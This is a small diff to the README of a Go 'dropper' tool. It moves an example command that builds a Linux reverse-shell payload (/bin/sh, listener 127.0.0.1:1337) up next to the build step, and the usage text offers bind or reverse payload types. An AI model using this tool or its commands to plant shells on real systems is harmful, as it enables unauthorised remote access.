@@ -35,6 +35,7 @@ Once cloned, change to the dropper folder and give it a test run.
 Feel free to compile it and use provide arguments to quickly build your payloads. 
 
 <code>go build dropper.go</code><br>
+<code>./dropper -o potato -p linux -l 127.0.0.1:1337 -s /bin/sh -t reverse</code><br>
 <code>./dropper -h</code>
 <pre>
 Usage of ./dropper:
@@ -51,6 +52,4 @@ Usage of ./dropper:
 	-t string
 		Payload type: bind/reverse
 </pre>
- Example:
- <code>./dropper -o potato -p linux -l 127.0.0.1:1337 -s /bin/sh -t reverse</code>
  
